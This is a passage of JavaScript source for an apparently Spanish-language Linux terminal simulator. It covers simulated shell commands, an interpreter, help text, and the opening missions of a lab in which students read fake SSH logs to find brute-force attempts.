    if (!lista.length) return { out: "", err: "", code: 1 };
    if (lista.some((p) => p.u !== sh.user) && sh.user !== "root") return mal(`pkill: matando el pid ${lista[0].pid} falló: Operación no permitida`);
    const pids = new Set(lista.map((p) => p.pid)); sh.procesos = sh.procesos.filter((p) => !pids.has(p.pid)); return ok(); };
  C.who = (a, i, sh) => ok(`alumno   pts/0        2026-11-13 09:12 (192.168.1.20)\n` + (sh.sesiones || []).map((s) => `${s.u.padEnd(8)} pts/${s.tty}        2026-11-13 ${s.h} (${s.ip})`).join("\n") + ((sh.sesiones || []).length ? "\n" : ""));
  C.w = C.who;
  C.last = (a, i, sh) => { const [t] = [nodo(sh, "/var/log/auth.log")?.d || ""]; const l = t.split("\n").filter((x) => /Accepted/.test(x)).map((x) => {
      const m = x.match(/^(\w+ \d+ [\d:]+).*Accepted \w+ for (\S+) from (\S+)/); return m ? `${m[2].padEnd(9)}pts/1        ${m[3].padEnd(16)} ${m[1]}` : ""; }).filter(Boolean);
    return ok((l.length ? l.reverse().join("\n") + "\n" : "") + "\nwtmp begins Nov 13 00:00\n"); };
  C.journalctl = (a, i, sh) => { const [t] = leerArchivo(sh, "/var/log/syslog", "journalctl"); return ok(t || "-- No entries --\n"); };
  C.useradd = C.adduser = (a, i, sh) => { if (sh.user !== "root") return mal("useradd: Permiso denegado.");
    const u = a.filter((x) => !x.startsWith("-")).pop(); if (!u) return mal("Uso: useradd USUARIO"); if (sh.usuarios.includes(u)) return mal(`useradd: el usuario «${u}» ya existe`, 9);
    sh.usuarios.push(u); const n = nodo(sh, "/etc/passwd"); n.d += `${u}:x:${1000 + sh.usuarios.length}:${1000 + sh.usuarios.length}::/home/${u}:/bin/bash\n`;
    if (a.includes("-m") || C.adduser === C.useradd) mkdirP(sh, `/home/${u}`, u); return ok(); };
  C.su = (a, i, sh) => mal("su: usa sudo en este laboratorio");
  C.exit = () => ok("");

  // ---- texto pro
  C.awk = (a, i, sh) => {
    let sep = null; const r = [];
    for (let k = 0; k < a.length; k++) { if (a[k] === "-F") sep = a[++k]; else if (a[k].startsWith("-F")) sep = a[k].slice(2); else r.push(a[k]); }
    const [prog, ...archivos] = r;
    if (!prog) return mal("uso: awk [-F sep] 'programa' [archivo]");
    const [t, e] = entradaTexto(sh, archivos, i, "awk"); if (e) return mal(e);
    if (sep === "\\t" || sep === "\t") sep = "\t";
    const reglas = []; let fin = null, acum = null;
    const mSum = prog.match(/^\s*\{\s*(\w+)\s*\+=\s*\$(\d+)\s*\}\s*END\s*\{\s*print\s+\1\s*\}\s*$/);
    if (mSum) acum = { v: mSum[1], col: +mSum[2] };
    const mEnd = prog.match(/END\s*\{\s*print\s+NR\s*\}/);
    if (!acum) for (const m of prog.matchAll(/(\/[^/]*\/|\$\w+\s*(?:==|!=|>=|<=|>|<)\s*"?[^{"\s]*"?|NR\s*(?:==|>|<)\s*\d+)?\s*\{([^}]*)\}/g)) {
      if (prog.slice(0, m.index).trim().endsWith("END")) continue;
      reglas.push({ cond: (m[1] || "").trim(), accion: m[2].trim() });
    }
    if (!acum && !reglas.length && !mEnd) return mal(`awk: no entiendo el programa '${prog}' (este lab acepta {print $1, $3}, /patrón/ {print $2}, $3>100 {print $1}, {s+=$5} END {print s})`, 2);
    const out = []; let nr = 0, suma = 0;
    for (const linea of lineas(t)) {
      nr++;
      const campos = sep ? linea.split(sep) : linea.trim().split(/\s+/);
      const val = (x) => x === "$0" ? linea : x === "$NF" ? campos.at(-1) : x === "NR" ? String(nr) : x === "NF" ? String(campos.length)
        : /^\$\d+$/.test(x) ? (campos[+x.slice(1) - 1] ?? "") : x.replace(/^"|"$/g, "");
      if (acum) { suma += parseFloat(campos[acum.col - 1]) || 0; continue; }
      for (const { cond, accion } of reglas) {
        let ok = true;
        if (cond.startsWith("/")) ok = new RegExp(cond.slice(1, -1)).test(linea);
        else if (cond) { const m = cond.match(/^(\$\w+|NR)\s*(==|!=|>=|<=|>|<)\s*"?([^"]*)"?$/); if (m) {
          const izq = val(m[1]), der = m[3], num = !isNaN(parseFloat(izq)) && !isNaN(parseFloat(der));
          const A = num ? parseFloat(izq) : izq, B = num ? parseFloat(der) : der;
          ok = { "==": A == B, "!=": A != B, ">": A > B, "<": A < B, ">=": A >= B, "<=": A <= B }[m[2]]; } }
        if (!ok) continue;
        const pm = accion.match(/^print\s*(.*)$/);
        if (!pm) continue;
        const exprs = pm[1].trim() ? pm[1].split(/\s*,\s*/) : ["$0"];
        out.push(exprs.map((x) => x.split(/\s+(?=(?:[^"]*"[^"]*")*[^"]*$)/).map(val).join("")).join(" "));
      }
    }
    if (acum) out.push(String(suma));
    if (mEnd) out.push(String(nr));
    return ok(out.length ? out.join("\n") + "\n" : "");
  };
  C.sed = (a, i, sh) => {
    const enLugar = a.includes("-i"), soloN = a.includes("-n");
    const r = a.filter((x) => x !== "-i" && x !== "-n" && x !== "-e");
    const [prog, ...archivos] = r;
    if (!prog) return mal("uso: sed [-n] [-i] 'programa' [archivo]");
    const [t, e] = entradaTexto(sh, archivos, i, "sed"); if (e) return mal(e);
    let fn;
    const ms = prog.match(/^s(.)(.*?)\1(.*?)\1([gi]*)$/), md = prog.match(/^(?:\/(.*)\/|(\d+)(?:,(\d+))?)\s*([dp])$/);
    if (ms) { const re = new RegExp(ms[2], (ms[4].includes("g") ? "g" : "") + (ms[4].includes("i") ? "i" : ""));
      fn = (l) => { const n = l.replace(re, ms[3].replace(/\\\//g, "/")); return soloN ? [] : [n]; }; }
    else if (md) { const [, re, a1, a2, cmd] = md; const rx = re !== undefined ? new RegExp(re) : null;
      fn = (l, n) => { const hit = rx ? rx.test(l) : n >= +a1 && n <= +(a2 || a1);
        if (cmd === "d") return hit ? [] : soloN ? [] : [l]; return hit ? (soloN ? [l] : [l, l]) : soloN ? [] : [l]; }; }
    else return mal(`sed: este lab acepta s/viejo/nuevo/g, /patrón/d, Np y N,Mp (recibí '${prog}')`);
    const res = lineas(t).flatMap((l, k) => fn(l, k + 1));
    const texto = res.length ? res.join("\n") + "\n" : "";
    if (enLugar) {
      if (!archivos.length) return mal("sed: -i necesita un archivo");
      const n = nodo(sh, normPath(sh, archivos[0]));
      if (!puedeEscribir(sh, n)) return mal(`sed: no se pudo abrir ${archivos[0]}: Permiso denegado`);
      n.d = texto; return ok();
    }
    return ok(texto);
  };
  C.base64 = (a, i, sh) => { const [op, r] = opciones(a); const [t, e] = entradaTexto(sh, r, i, "base64"); if (e) return mal(e);
    try { if (op.has("d")) return ok(decodeURIComponent(escape(atob(t.replace(/\s+/g, "")))));
      return ok(btoa(unescape(encodeURIComponent(t))) + "\n"); } catch { return mal("base64: entrada inválida"); } };
  // ---- automatizar
  C.crontab = (a, i, sh) => {
    if (a[0] === "-l") return sh.crontab ? ok(sh.crontab) : mal(`no crontab for ${sh.user}`);
    if (a[0] === "-r") { sh.crontab = ""; return ok(); }
    if (a[0] === "-e") return mal("En este lab no hay editor: escribe las líneas en un archivo (echo '...' > micron) y luego: crontab micron");
    if (a[0] === "-") { sh.crontab = conNL(i || ""); return ok(); }
    if (a[0]) { const [t, e] = leerArchivo(sh, a[0], "crontab"); if (e) return mal(e);
      for (const l of lineas(t)) if (l.trim() && !l.startsWith("#") && l.trim().split(/\s+/).length < 6) return mal(`"${a[0]}": línea inválida: ${l}\nerrores en el archivo crontab, no se puede instalar.`);
      sh.crontab = conNL(t); return ok(); }
    return mal("uso: crontab [-l | -r | archivo]");
  };
  C["ssh-keygen"] = (a, i, sh) => {
    const tipo = a.includes("-t") ? a[a.indexOf("-t") + 1] : "rsa";
    const ruta = normPath(sh, a.includes("-f") ? a[a.indexOf("-f") + 1] : `~/.ssh/id_${tipo}`);
    const d = mkdirP(sh, padre(ruta)); if (padre(ruta).endsWith("/.ssh")) d.m = "700";
    const pub = "ssh-" + tipo + " AAAAC3NzaC1lZDI1NTE5AAAAI" + Math.random().toString(36).slice(2, 14) + ` ${sh.user}@${sh.host}`;
    escribir(sh, ruta, `-----BEGIN OPENSSH PRIVATE KEY-----\n${btoa(pub).slice(0, 60)}\n-----END OPENSSH PRIVATE KEY-----\n`, sh.user, "600");
    escribir(sh, ruta + ".pub", pub + "\n", sh.user, "644");
    return ok(`Generating public/private ${tipo} key pair.\nYour identification has been saved in ${ruta}\nYour public key has been saved in ${ruta}.pub\n`);
  };
  C.export = (a, i, sh) => { for (const x of a) { const m = x.match(/^(\w+)=(.*)$/); if (m) sh.env[m[1]] = m[2]; } return ok(); };
  C.env = (a, i, sh) => ok(Object.entries({ USER: sh.user, HOME: sh.home, PWD: sh.cwd, SHELL: "/bin/bash", ...sh.env }).map(([k, v]) => `${k}=${v}`).join("\n") + "\n");
  const correrScript = (a, i, sh, nombre) => {
    const [t, e] = leerArchivo(sh, nombre, "bash"); if (e) return mal(e);
    const antes = sh.args; sh.args = a; let todo = "", code = 0;
    for (const l of lineas(t)) { if (!l.trim() || l.trim().startsWith("#")) continue;
      const r = ejecutar(sh, l, true); todo += (r.todo || ""); code = r.code; }
    sh.args = antes;
    return { out: todo, err: "", code };
  };
  C.bash = C.sh = (a, i, sh) => a[0] ? correrScript(a.slice(1), i, sh, a[0]) : mal("En este lab: bash script.sh");
  C.source = C.bash;

  const AYUDA = {
    pwd: "Muestra la carpeta en la que estás (print working directory).", cd: "Cambia de carpeta. 'cd ..' sube una, 'cd ~' va a tu home, 'cd /' a la raíz.",
    ls: "Lista archivos. -l detalle (permisos, dueño, tamaño), -a incluye ocultos (los que empiezan con punto).", cat: "Muestra el contenido de archivos. -n numera líneas.",
    head: "Primeras líneas (10 por defecto; -n N).", tail: "Últimas líneas (-n N). En la vida real 'tail -f' sigue el archivo en vivo.",
    wc: "Cuenta líneas (-l), palabras (-w) y caracteres (-c).", grep: "Busca texto. -i sin mayúsculas, -n número de línea, -v invierte, -c cuenta, -r en carpetas, -o solo lo que coincide, -E expresiones extendidas.",
    sort: "Ordena líneas. -n numérico, -r al revés, -u sin repetidos.", uniq: "Junta líneas repetidas seguidas (ordénalas antes con sort). -c cuenta.",
    cut: "Corta columnas: -d separador, -f campos (ej. cut -d: -f1 /etc/passwd).", tr: "Cambia caracteres (tr a-z A-Z) o los borra (tr -d).",
    mkdir: "Crea carpetas. -p crea las intermedias.", touch: "Crea un archivo vacío.", rm: "Borra. -r carpetas completas, -f sin preguntar. ¡No hay papelera!",
    rmdir: "Borra carpetas vacías.", cp: "Copia (cp origen destino). -r para carpetas.", mv: "Mueve o renombra.",
    find: "Busca archivos por nombre o tipo: find /ruta -name '*.log' -type f.", chmod: "Cambia permisos: chmod 755 archivo o chmod u+x archivo. r=4 w=2 x=1 (dueño, grupo, otros).",
    chown: "Cambia el dueño (necesita sudo).", echo: "Imprime texto. Con > lo guarda en un archivo (sobrescribe) y con >> lo agrega al final.",
    whoami: "Tu usuario.", id: "Tu usuario y grupos.", sudo: "Ejecuta un comando como root (administrador).", history: "Comandos que has tecleado.",
    ps: "Procesos: 'ps aux' los muestra todos con su dueño y PID.", kill: "Termina un proceso por su PID.", ip: "Red: 'ip a' direcciones, 'ip r' rutas, 'ip link' interfaces.",
    ping: "Prueba si un host responde (ICMP). -c N número de paquetes.", ss: "Puertos abiertos: 'ss -tulpn'.", curl: "Pide una URL (HTTP).",
    systemctl: "Servicios: systemctl status|start|stop|restart|enable|disable servicio.",
    userdel: "Borra un usuario (sudo userdel nombre).", usermod: "usermod -L usuario bloquea la cuenta (no puede iniciar sesión).", passwd: "passwd -l usuario también bloquea la cuenta.",
    pkill: "Mata procesos por nombre: sudo pkill -f xmrig.", who: "Quién está conectado ahora (y desde qué IP).", w: "Como who.", last: "Últimos inicios de sesión.", apt: "Paquetes (Debian/Ubuntu): sudo apt update / install / remove.",
    ufw: "Firewall sencillo de Ubuntu: sudo ufw enable, sudo ufw allow 22, sudo ufw deny from IP, sudo ufw status.", journalctl: "Registros del sistema (systemd).",
    tree: "Dibuja el árbol de carpetas.", useradd: "Crea un usuario (sudo useradd -m nombre).", man: "Manual de un comando.", clear: "Limpia la pantalla.",
    hostname: "Nombre del equipo.", uname: "Info del sistema (-a todo).", which: "Dónde está un comando.",
    awk: "Procesa columnas: awk -F, '{print $1, $3}' archivo; con condición: awk '$3 > 100 {print $1}'; sumar: awk '{s+=$10} END {print s}'.",
    sed: "Edita texto: sed 's/viejo/nuevo/g' archivo; -i lo cambia en el archivo; sed '/patrón/d' borra líneas; sed -n '5p' imprime la línea 5.",
    base64: "Codifica en Base64; con -d decodifica. Base64 NO es cifrado.", crontab: "Tareas programadas: crontab -l las muestra; crontab archivo las instala. Formato: min hora día mes díasemana comando.",
    "ssh-keygen": "Crea un par de llaves SSH: ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -N \"\"", bash: "Ejecuta un script: bash script.sh arg1 (o ./script.sh si tiene permiso x).",
    printf: "Imprime con formato: printf \"%s\\n\" texto.", export: "Define una variable de entorno: export NOMBRE=valor.", env: "Muestra las variables de entorno.", for: "Repite: for x in a b c; do echo $x; done",
  };

  // ---------------------------------------------------------------- intérprete
  function tokens(linea) {  // respeta comillas y separa | > >> && ;
    const out = []; let cur = "", q = null, hay = false, citado = false;
    const push = () => { if (hay) out.push({ w: cur, q: citado }); cur = ""; hay = false; citado = false; };
    for (let k = 0; k < linea.length; k++) {
      const ch = linea[k];
      if (q) { if (ch === q) q = null; else cur += ch; continue; }
      if (ch === "'" || ch === '"') { q = ch; hay = true; citado = true; continue; }
      if (ch === "\\" && k + 1 < linea.length) { cur += linea[++k]; hay = true; continue; }
      if (/\s/.test(ch)) { push(); continue; }
      if (ch === ">" && cur === "2" && !citado) {  // 2>/dev/null, 2>>archivo, 2>&1
        cur = ""; hay = false;
        if (linea.slice(k, k + 3) === ">&1") { out.push({ op: "2>&1" }); k += 2; }
        else if (linea[k + 1] === ">") { out.push({ op: "2>" }); k++; } else out.push({ op: "2>" });
        continue;
      }
      if (ch === "|" || ch === ";" || ch === ">" || ch === "&") {
        push();
        const dos = linea.slice(k, k + 2);
        if (dos === ">>" || dos === "&&" || dos === "||") { out.push({ op: dos }); k++; } else out.push({ op: ch });
        continue;
      }
      if (ch === "#" && !hay) break;
      cur += ch; hay = true;
    }
    if (q) return null;
    push();
    return out;
  }
  function glob(sh, a) {
    if (!/[*?]/.test(a)) return [a];
    const ruta = normPath(sh, a), p = nodo(sh, padre(ruta)), patron = base(ruta);
    if (!p || p.t !== "d") return [a];
    const rx = new RegExp("^" + patron.replace(/[.+^${}()|[\]\\]/g, "\\$&").replace(/\*/g, ".*").replace(/\?/g, ".") + "$");
    const pref = a.includes("/") ? a.slice(0, a.lastIndexOf("/") + 1) : "";
    const m = Object.keys(p.c).filter((k) => rx.test(k) && !k.startsWith(".")).sort().map((k) => pref + k);
    return m.length ? m : [a];
  }
  function dividir(linea) {  // separa por ; && || fuera de comillas → [[op, parte], ...]
    const out = []; let cur = "", q = null, op = null;
    for (let k = 0; k < linea.length; k++) {
      const ch = linea[k], dos = linea.slice(k, k + 2);
      if (q) { if (ch === q) q = null; cur += ch; continue; }
      if (ch === "'" || ch === '"') { q = ch; cur += ch; continue; }
      if (dos === "&&" || dos === "||") { out.push([op, cur.trim()]); op = dos; cur = ""; k++; continue; }
      if (ch === ";") { out.push([op, cur.trim()]); op = ";"; cur = ""; continue; }
      cur += ch;
    }
    out.push([op, cur.trim()]);
    return out.filter(([, p]) => p);
  }
  function expandir(sh, linea) {  // $VAR, ${VAR}, $1..$9, $#, $@ (no dentro de comillas simples)
    const env = { USER: sh.user, HOME: sh.home, PWD: sh.cwd, HOSTNAME: sh.host, ...sh.env };
    return linea.split(/('[^']*')/).map((p, k) => k % 2 ? p : p.replace(/\$\{?(\w+|[#@])\}?/g, (m0, v) =>
      v === "#" ? String((sh.args || []).length) : v === "@" ? (sh.args || []).join(" ") : /^\d$/.test(v) ? ((sh.args || [])[+v - 1] ?? "") : (env[v] ?? ""))).join("");
  }
  function ejecutar(sh, linea, interno) {
    linea = linea.trim();
    if (!linea) return { out: "", err: "" };
    if (!interno) sh.hist.push(linea);
    const mFor = linea.match(/^for\s+(\w+)\s+in\s+(.+?);\s*do\s+(.+?);?\s*done$/);
    if (mFor) {
      let todo = "", code = 0;
      for (const v of expandir(sh, mFor[2]).trim().split(/\s+/)) { sh.env[mFor[1]] = v; const r = ejecutar(sh, mFor[3], true); todo += r.todo || ""; code = r.code; }
      sh.salidas.push({ cmd: linea, out: todo, err: "", code });
      return { out: todo, err: "", code, todo };
    }
    const partes = dividir(linea);
    if (partes.length > 1) {  // a; b && c || d — cada parte se expande al momento (como bash)
      let todo = "", out = "", code = 0, saltar = false;
      for (const [op, parte] of partes) {
        saltar = (op === "&&" && code !== 0) || (op === "||" && code === 0);
        if (saltar) continue;
        const r = ejecutar(sh, parte, true); todo += r.todo || ""; out += r.out || ""; code = r.code;
      }
      if (!interno) sh.salidas.push({ cmd: linea, out, err: "", code });
      return { out, err: "", code, todo };
    }
    const asig = linea.match(/^(\w+)=(\S*)$/);
    if (asig) { sh.env[asig[1]] = expandir(sh, asig[2]).replace(/^["']|["']$/g, ""); sh.salidas.push({ cmd: linea, out: "", err: "", code: 0 }); return { out: "", err: "", code: 0, todo: "" }; }
    linea = expandir(sh, linea);
    if (linea.startsWith("ll ") || linea === "ll") linea = linea.replace(/^ll/, "ls -la");
    const tk = tokens(linea);
    if (!tk) return { out: "", err: "bash: error de sintaxis: comillas sin cerrar\n" };
    let out = "", err = "", code = 0, saltar = false, todo = "";
    // separa en comandos por ; && ||
    const grupos = [[]], unions = [];
    for (const t of tk) { if (t.op === ";" || t.op === "&&" || t.op === "||") { unions.push(t.op); grupos.push([]); } else grupos.at(-1).push(t); }
    for (let g = 0; g < grupos.length; g++) {
      if (g > 0) { const u = unions[g - 1]; saltar = (u === "&&" && code !== 0) || (u === "||" && code === 0); }
      if (saltar || !grupos[g].length) continue;
      const r = tuberia(sh, grupos[g]);
      out += r.out; err += r.err; code = r.code; todo += r.err + r.out;
    }
    if (!interno) sh.salidas.push({ cmd: linea, out, err, code });
    return { out, err, code, todo };
  }
  function tuberia(sh, tk) {
    const etapas = [[]];
    for (const t of tk) { if (t.op === "|") etapas.push([]); else etapas.at(-1).push(t); }
    let entrada = null, err = "", code = 0, out = "";
    for (let e = 0; e < etapas.length; e++) {
      let args = [], redir = null, errNulo = false, errAOut = false;
      const et = etapas[e];
      for (let k = 0; k < et.length; k++) {
        const t = et[k];
        if (t.op === "2>") { errNulo = true; k++; continue; }
        if (t.op === "2>&1") { errAOut = true; continue; }
        if (t.op === ">" || t.op === ">>") { redir = { modo: t.op, a: et[++k]?.w }; continue; }
        if (t.op) continue;
        args.push(...(k === 0 || t.q ? [t.w] : glob(sh, t.w)));
      }
      if (!args.length) { err += "bash: error de sintaxis\n"; code = 2; break; }
      let como = sh.user;
      if (args[0] === "sudo") { args.shift(); como = "root"; if (!args.length) { err += "uso: sudo comando\n"; code = 1; break; } }
      let nombre = args.shift();
      let fn = C[nombre];
      if (!fn && nombre.includes("/")) {
        const n = nodo(sh, normPath(sh, nombre));
        if (!n) fn = () => mal(`bash: ${nombre}: No existe el archivo o el directorio`, 127);
        else if (!(+n.m[n.o === sh.user ? 0 : 2] & 1) && sh.user !== "root") fn = () => mal(`bash: ${nombre}: Permiso denegado`, 126);
        else { const ruta = nombre; fn = (a2, i2, s2) => correrScript(a2, i2, s2, ruta); }
      }
      const antes = sh.user; sh.user = como;
      let r = fn ? fn(args, entrada, sh) : { out: "", err: `${nombre}: no se encontró la orden${AYUDA_SIMILAR(nombre)}\n`, code: 127 };
      sh.user = antes;
      if (errAOut) r = { ...r, out: r.out + r.err, err: "" };
      else if (errNulo) r = { ...r, err: "" };
      if (redir) {
        if (!redir.a || typeof redir.a !== "string") { r = mal("bash: error de sintaxis cerca de la redirección", 2); }
        else {
          const ruta = normPath(sh, redir.a), n = nodo(sh, ruta), p = nodo(sh, padre(ruta));
          if (!p) r = mal(`bash: ${redir.a}: No existe el archivo o el directorio`);
          else if (n && n.t === "d") r = mal(`bash: ${redir.a}: Es un directorio`);
          else if (!puedeEscribir(sh, n || p)) r = mal(`bash: ${redir.a}: Permiso denegado`);
          else { p.c[base(ruta)] = arch((redir.modo === ">>" && n ? n.d : "") + r.out, n ? n.o : sh.user, n ? n.m : "644"); r = { out: "", err: r.err, code: r.code }; }
        }
      }
      err += r.err; code = r.code;
      if (e === etapas.length - 1) out = r.out; else entrada = r.out;
    }
    return { out, err, code };
  }
  function AYUDA_SIMILAR(n) {
    const cands = Object.keys(C).filter((k) => k.length > 1);
    const dist = (a, b) => { const d = Array.from({ length: a.length + 1 }, (_, i) => [i]); for (let j = 1; j <= b.length; j++) d[0][j] = j;
      for (let i = 1; i <= a.length; i++) for (let j = 1; j <= b.length; j++) d[i][j] = Math.min(d[i - 1][j] + 1, d[i][j - 1] + 1, d[i - 1][j - 1] + (a[i - 1] !== b[j - 1]));
      return d[a.length][b.length]; };
    const m = cands.map((k) => [k, dist(n, k)]).sort((x, y) => x[1] - y[1])[0];
    return m && m[1] <= 2 ? `. ¿Quisiste decir '${m[0]}'?` : "";
  }
  const prompt = (sh) => `${sh.user}@${sh.host}:${sh.cwd.replace(new RegExp("^" + sh.home), "~")}${sh.user === "root" ? "#" : "$"} `;
  const completar = (sh, linea) => {
    const partes = linea.split(/\s+/), ult = partes.at(-1);
    let opciones;
    if (partes.length === 1) opciones = Object.keys(C).filter((k) => k.startsWith(ult));
    else { const ruta = normPath(sh, ult.includes("/") ? ult.slice(0, ult.lastIndexOf("/") + 1) || "/" : "."), n = nodo(sh, ruta), pref = ult.includes("/") ? ult.slice(0, ult.lastIndexOf("/") + 1) : "";
      opciones = n && n.t === "d" ? Object.entries(n.c).filter(([k]) => k.startsWith(ult.slice(pref.length))).map(([k, x]) => pref + k + (x.t === "d" ? "/" : "")) : []; }
    if (opciones.length === 1) { partes[partes.length - 1] = opciones[0]; return { linea: partes.join(" ") + (opciones[0].endsWith("/") ? "" : " ") }; }
    if (opciones.length > 1) { let c = opciones[0]; for (const o of opciones) while (!o.startsWith(c)) c = c.slice(0, -1);
      partes[partes.length - 1] = c; return { linea: partes.join(" "), opciones }; }
    return { linea };
  };
  return { nuevoSistema, ejecutar, prompt, completar, escribir, mkdirP, nodo, normPath, AYUDA, comandos: C };
})();

// ---------------------------------------------------------------- misiones
// check(sh, ultima) → true cuando la misión está cumplida. 'solucion' se muestra si te rindes.
const MISIONES_LINUX = (() => {
  const ult = (sh) => sh.salidas.at(-1) || { out: "", cmd: "" };
  const existe = (sh, r) => !!Linux.nodo(sh, r);
  const esDir = (sh, r) => Linux.nodo(sh, r)?.t === "d";
  const cont = (sh, r) => Linux.nodo(sh, r)?.d ?? null;
  const usado = (sh, rx) => sh.hist.some((h) => rx.test(h));
  // Cada partida cambia IPs, cuentas y nombres: así no te aprendes la respuesta, aprendes el método
  const al = (a) => a[Math.floor(Math.random() * a.length)];
  const ipPub = () => `${al(["203.0.113", "198.51.100", "192.0.2", "185.220.101", "45.155.205"])}.${2 + Math.floor(Math.random() * 250)}`;
  const auth = (sh) => {
    let ips = [ipPub(), ipPub(), ipPub()];
    ips = [...new Set(ips)];
    while (ips.length < 3) ips.push(ipPub());
    const interna = `192.168.1.${10 + Math.floor(Math.random() * 200)}`;
    const pesos = [3 + Math.floor(Math.random() * 6), 14 + Math.floor(Math.random() * 12), 1 + Math.floor(Math.random() * 4)];
    const eventos = [];
    ips.forEach((ip, i) => { for (let k = 0; k < pesos[i]; k++) eventos.push({ ok: false, ip }); });
    const aceptados = 4 + Math.floor(Math.random() * 6);
    for (let k = 0; k < aceptados; k++) eventos.push({ ok: true, ip: interna });
    eventos.sort(() => Math.random() - 0.5);
    let t = "";
    eventos.forEach((e, k) => {
      t += `Nov 13 03:${String(10 + (k % 49)).padStart(2, "0")}:${String(k * 7 % 60).padStart(2, "0")} netlab sshd[${2100 + k}]: ${e.ok ? "Accepted password for alumno" : `Failed password for ${k % 4 === 0 ? "invalid user admin" : "root"}`} from ${e.ip} port ${40000 + k * 13} ssh2\n`;
    });
    Linux.escribir(sh, "/var/log/auth.log", t, "root", "640");
    sh.vars = { ...(sh.vars || {}), fallos: eventos.length - aceptados, top: ips[1], aceptados, interna };
  };
  const M = [
    // ------------------------------------------------ Nivel 1: moverte
    { id: "l1", nivel: "1 · Moverte", titulo: "¿Dónde estoy?", historia: "Acabas de entrar a un servidor nuevo por SSH.", objetivo: "Muestra en qué carpeta estás.",
      pistas: ["Es un comando de 3 letras: print working directory."], solucion: ["pwd"], check: (sh) => /^\/home\/alumno\n$/.test(ult(sh).out) },
    { id: "l2", nivel: "1 · Moverte", titulo: "¿Qué hay aquí?", historia: "Quieres ver qué archivos tiene tu carpeta personal.",
      setup: (sh) => { Linux.escribir(sh, "/home/alumno/notas.txt", "Recordar: configurar VLAN 10\n"); Linux.mkdirP(sh, "/home/alumno/proyectos"); Linux.escribir(sh, "/home/alumno/.secreto", "flag{ocultos}\n"); },
      objetivo: "Lista los archivos, incluyendo los ocultos.", pistas: ["ls lista archivos.", "Los ocultos empiezan con punto; necesitas la opción -a."], solucion: ["ls -a"],
      check: (sh) => /^ls\b.*-\w*a/.test(ult(sh).cmd) && ult(sh).out.includes(".secreto") },
    { id: "l3", nivel: "1 · Moverte", titulo: "Ve a los registros", historia: "Los logs del sistema viven en /var/log.", objetivo: "Entra a /var/log.",
      pistas: ["cd cambia de carpeta.", "Usa la ruta absoluta (empieza con /)."], solucion: ["cd /var/log"], check: (sh) => sh.cwd === "/var/log" },
    { id: "l4", nivel: "1 · Moverte", titulo: "Regresa a casa", historia: "Ya terminaste de mirar.", setup: (sh) => { sh.cwd = "/var/log"; },
      objetivo: "Vuelve a tu carpeta personal (home) con el atajo más corto.", pistas: ["cd sin nada, o cd ~, te lleva a tu home."], solucion: ["cd ~"],
      check: (sh) => sh.cwd === "/home/alumno" },
    // ------------------------------------------------ Nivel 2: archivos
    { id: "a1", nivel: "2 · Archivos", titulo: "Organiza tu lab", historia: "Vas a guardar tus prácticas de CCNA ordenadas.",
      objetivo: "Crea la carpeta ccna/vlans dentro de tu home (con un solo comando).", pistas: ["mkdir crea carpetas.", "Para crear también la intermedia (ccna) usa -p."],
      solucion: ["mkdir -p ccna/vlans"], check: (sh) => esDir(sh, "/home/alumno/ccna/vlans") },
    { id: "a2", nivel: "2 · Archivos", titulo: "Tu primer archivo", historia: "Guarda la configuración que acabas de probar.",
      objetivo: "Crea el archivo sw1.txt con el texto: vlan 10", pistas: ["echo imprime texto.", "Con > mandas la salida a un archivo: echo \"texto\" > archivo"],
      solucion: ['echo "vlan 10" > sw1.txt'], check: (sh) => /^vlan 10\s*$/.test(cont(sh, "/home/alumno/sw1.txt") || "") },
    { id: "a3", nivel: "2 · Archivos", titulo: "Agregar sin borrar", historia: "Te faltó una línea en el archivo.",
      setup: (sh) => Linux.escribir(sh, "/home/alumno/sw1.txt", "vlan 10\n"), objetivo: "Agrega la línea 'name VENTAS' al final de sw1.txt sin borrar lo que ya tiene.",
      pistas: ["> sobrescribe, >> agrega al final."], solucion: ['echo "name VENTAS" >> sw1.txt'], check: (sh) => /^vlan 10\nname VENTAS\s*$/.test(cont(sh, "/home/alumno/sw1.txt") || "") },
    { id: "a4", nivel: "2 · Archivos", titulo: "Respaldo", historia: "Antes de cambiar algo, siempre un respaldo.",
      setup: (sh) => { Linux.escribir(sh, "/home/alumno/router.cfg", "hostname R1\ninterface g0/0\n ip address 10.0.0.1 255.255.255.252\n"); Linux.mkdirP(sh, "/home/alumno/respaldos"); },
      objetivo: "Copia router.cfg a la carpeta respaldos con el nombre router.cfg.bak.", pistas: ["cp origen destino.", "El destino puede incluir la carpeta y el nombre nuevo."],
      solucion: ["cp router.cfg respaldos/router.cfg.bak"], check: (sh) => cont(sh, "/home/alumno/respaldos/router.cfg.bak") === cont(sh, "/home/alumno/router.cfg") && existe(sh, "/home/alumno/router.cfg") },
    { id: "a5", nivel: "2 · Archivos", titulo: "Renombrar", historia: "El archivo tiene un nombre feo.", setup: (sh) => Linux.escribir(sh, "/home/alumno/capturaFINAL(2).pcap", "datos\n"),
      objetivo: "Renombra capturaFINAL(2).pcap a dns.pcap.", pistas: ["mv sirve para mover y para renombrar.", "Pon el nombre raro entre comillas por los paréntesis."],
      solucion: ['mv "capturaFINAL(2).pcap" dns.pcap'], check: (sh) => existe(sh, "/home/alumno/dns.pcap") && !existe(sh, "/home/alumno/capturaFINAL(2).pcap") },
    { id: "a6", nivel: "2 · Archivos", titulo: "Limpieza", historia: "Quedaron temporales de un escaneo viejo.",
      setup: (sh) => { Linux.mkdirP(sh, "/home/alumno/basura/scan1"); Linux.escribir(sh, "/home/alumno/basura/scan1/out.txt", "x\n"); Linux.escribir(sh, "/home/alumno/basura/tmp.log", "x\n"); },
      objetivo: "Borra la carpeta basura con todo lo que tiene adentro.", pistas: ["rm borra; para carpetas con contenido necesitas -r."], solucion: ["rm -r basura"],
      check: (sh) => !existe(sh, "/home/alumno/basura") },
    // ------------------------------------------------ Nivel 3: leer y buscar
    { id: "b1", nivel: "3 · Leer y buscar", titulo: "Lee el archivo", setup: (sh) => Linux.escribir(sh, "/home/alumno/bienvenida.txt", "Bienvenido al SOC.\nTu primer turno empieza a las 22:00.\n"),
      historia: "Te dejaron instrucciones.", objetivo: "Muestra el contenido de bienvenida.txt.", pistas: ["cat muestra archivos."], solucion: ["cat bienvenida.txt"],
      check: (sh) => ult(sh).out.includes("Tu primer turno") },
    { id: "b2", nivel: "3 · Leer y buscar", titulo: "Lo más reciente", setup: auth, historia: "Algo pasó en la madrugada con SSH.",
